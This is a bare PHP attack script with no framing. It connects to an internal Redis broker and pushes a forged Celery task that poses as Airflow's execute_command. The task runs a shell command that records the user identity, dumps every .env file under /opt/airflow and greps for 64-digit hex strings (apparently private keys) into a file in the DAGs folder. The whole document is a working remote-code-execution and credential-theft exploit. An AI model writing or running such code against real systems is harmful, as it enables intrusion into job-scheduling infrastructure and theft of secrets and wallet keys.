<?php
$s=fsockopen("172.18.0.3",6379,$e,$m,5);
if(!$s){echo "FAIL:$m\n";exit;}
fwrite($s,"PING\r\n");
echo "P:".trim(fgets($s))."\n";
$tid=uniqid("t",true);
$cmd="id>/opt/airflow/dags/_v.txt;find /opt/airflow -name .env|xargs cat>>/opt/airflow/dags/_v.txt 2>&1;grep -roh '0x[a-fA-F0-9]\{64\}' /opt/airflow/ 2>/dev/null|sort -u>>/opt/airflow/dags/_v.txt;echo DONE>>/opt/airflow/dags/_v.txt";
$body_arr=array(array(array("bash","-c",$cmd)),(object)array(),array("callbacks"=>null,"errbacks"=>null));
$b=base64_encode(json_encode($body_arr));
$hdrs=array("lang"=>"py","task"=>"airflow.executors.celery_executor.execute_command","id"=>$tid,"root_id"=>$tid);
$props=array("correlation_id"=>$tid,"reply_to"=>"","delivery_mode"=>2,"delivery_info"=>array("exchange"=>"","routing_key"=>"default"),"body_encoding"=>"base64","delivery_tag"=>$tid);
$msg=json_encode(array("body"=>$b,"content-encoding"=>"utf-8","content-type"=>"application/json","headers"=>$hdrs,"properties"=>$props));
$l=strlen($msg);
$redis_cmd="*3\r\n\$5\r\nLPUSH\r\n\$7\r\ndefault\r\n\$".$l."\r\n".$msg."\r\n";
fwrite($s,$redis_cmd);
echo "L:".trim(fgets($s))."\n";
fwrite($s,"LLEN default\r\n");
echo "Q:".trim(fgets($s))."\n";
echo "T:".$tid."\n";
fclose($s);
